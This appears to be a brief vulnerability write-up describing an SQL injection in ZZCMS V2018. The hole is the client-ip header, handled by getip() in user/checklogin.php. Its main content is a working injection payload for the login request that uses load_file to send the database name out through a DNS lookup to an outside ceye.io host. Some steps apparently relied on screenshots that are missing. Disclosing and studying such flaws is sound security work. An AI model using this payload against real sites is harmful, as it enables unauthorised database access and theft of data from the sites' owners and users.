ZZCMS V2018

SQL Injection

code: user\checklogin.php

Follow up this function：getip()

check_isip is a filter function,Follow up:

This is just a simple filter. It has nothing to do with it.

so there is SQL injection here.

At the time of landing,In HTTP head add this： client-ip: 122.122.122.122' and ((select load_file(concat('\\',(select database()),'.fvyr6w.ceye.io\abc'))))#

You can see that you have successfully obtained the Database name.
